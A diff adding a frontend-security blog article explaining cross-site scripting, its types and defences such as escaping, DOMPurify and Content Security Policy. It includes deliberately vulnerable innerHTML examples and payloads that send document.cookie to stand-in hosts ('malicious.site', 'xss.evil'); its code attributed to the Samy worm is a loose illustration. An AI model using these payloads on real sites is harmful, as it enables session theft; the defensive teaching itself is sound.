@@ -1,0 +1,191 @@
+---
+title: "XSS (Cross-Site Scripting) — The Frontend’s Worst Nightmare"
+slug: "security-xss"
+category: "Security"
+tags: ["security", "xss", "sanitization", "escaping", "javascript"]
+summary: "Cross-Site Scripting (XSS) is one of the most dangerous and common web vulnerabilities. Learn how XSS works, and how to prevent it using escaping, sanitization, and secure APIs."
+publishedAt: "2023-01-20"
+---
+
+# XSS (Cross-Site Scripting) — The Frontend’s Worst Nightmare
+
+Cross-Site Scripting, or **XSS**, is one of the most common — and most dangerous — vulnerabilities in web applications.
+
+It allows attackers to **inject malicious JavaScript** into your page. Once that happens, they can:
+- Steal cookies and tokens
+- Log keystrokes
+- Deface UI
+- Redirect users
+- Install fake login forms
+- Exfiltrate data via API
+
+XSS is consistently featured in OWASP Top 10 for a reason: it’s widespread, powerful, and often subtle.
+
+---
+
+## What Causes XSS?
+
+XSS happens when:
+- User-controlled input is **rendered into HTML**
+- That input is **not properly escaped or sanitized**
+
+This could be:
+- A blog comment rendered directly
+- A user name injected into the DOM
+- A URL parameter inserted into the page
+
+```js
+document.body.innerHTML = "Welcome " + location.hash;
+```
+
+Now try visiting: `https://example.com/#<script>alert(1)</script>`
+
+That’s XSS.
+
+---
+
+## Types of XSS
+
+### 1. Stored XSS
+
+Malicious payload is **persisted** (e.g. in a DB) and served to users.
+
+- Forum posts
+- Comments
+- User profiles
+
+### 2. Reflected XSS
+
+Payload is in the URL or query params and reflected in the response.
+
+- Search results
+- Error messages
+- Redirects
+
+### 3. DOM-Based XSS
+
+The injection occurs **entirely in client-side JavaScript** — no server involvement.
+
+```js
+let user = location.hash;
+document.body.innerHTML = "Hi " + user;
+```
+
+---
+
+## Real-World Example: MySpace Worm (2005)
+
+A user named Samy injected a script in his profile:
+
+```html
+<script>
+  document.body.innerHTML += 'I love Samy';
+  fetch('https://malicious.site', { method: 'POST', body: document.cookie });
+</script>
+```
+
+The script auto-added Samy as a friend — to anyone who viewed his profile. It went **viral**, infecting over a million users.
+
+---
+
+## How to Prevent XSS
+
+### 1. Escape Output
+
+Use encoding when inserting untrusted content into the DOM:
+- HTML encode (`<` becomes `&lt;`)
+- Use `textContent`, not `innerHTML`
+
+```js
+element.textContent = userInput;
+```
+
+### 2. Sanitize Rich Content
+
+Use libraries like:
+- DOMPurify
+- sanitize-html
+
+```js
+const clean = DOMPurify.sanitize(userInput);
+container.innerHTML = clean;
+```
+
+### 3. Avoid Dangerous APIs
+
+Don't use:
+- `innerHTML`
+- `document.write`
+- `eval`, `Function`, `setTimeout("code")`
+- `dangerouslySetInnerHTML` (React)
+
+Unless absolutely necessary — and never with untrusted input.
+
+### 4. Use CSP (Content Security Policy)
+
+CSP blocks inline scripts, third-party sources, and eval by default:
+
+```http
+Content-Security-Policy: script-src 'self'; object-src 'none';
+```
+
+---
+
+## Framework Protection
+
+### React
+
+Escapes HTML by default:
+
+```jsx
+<div>{userInput}</div> // safe
+
+<div dangerouslySetInnerHTML={{ __html: userInput }} /> // ⚠️ vulnerable
+```
+
+### Vue
+
+- Automatically escapes interpolated content
+- Use `v-html` with caution
+
+### Angular
+
+- Uses `DomSanitizer`
+- Context-aware escaping
+
+---
+
+## Testing for XSS
+
+- Chrome DevTools → Paste payloads
+- XSSHunter, Burp Suite
+- Manual audit of rendering code
+- Look for unescaped user content + `innerHTML`
+
+Try payloads like:
+```html
+"><script>alert(1)</script>
+<script>fetch('https://xss.evil?cookie=' + document.cookie)</script>
+```
+
+---
+
+## Anti-Patterns
+
+- Rendering user content with `innerHTML`
+- Accepting raw HTML input without sanitization
+- Copy-pasting `dangerouslySetInnerHTML` in React
+- Allowing `eval` or JS injection via query params
+
+---
+
+## Conclusion: Respect the DOM
+
+XSS is a symptom of trusting user input too much — and forgetting that the browser executes everything in the DOM.
+
+Protect your users.
+
+Escape your outputs. Sanitize your inputs. Audit your DOM mutations.
+
+Because even one line of unsafe code can compromise **everything**.
+
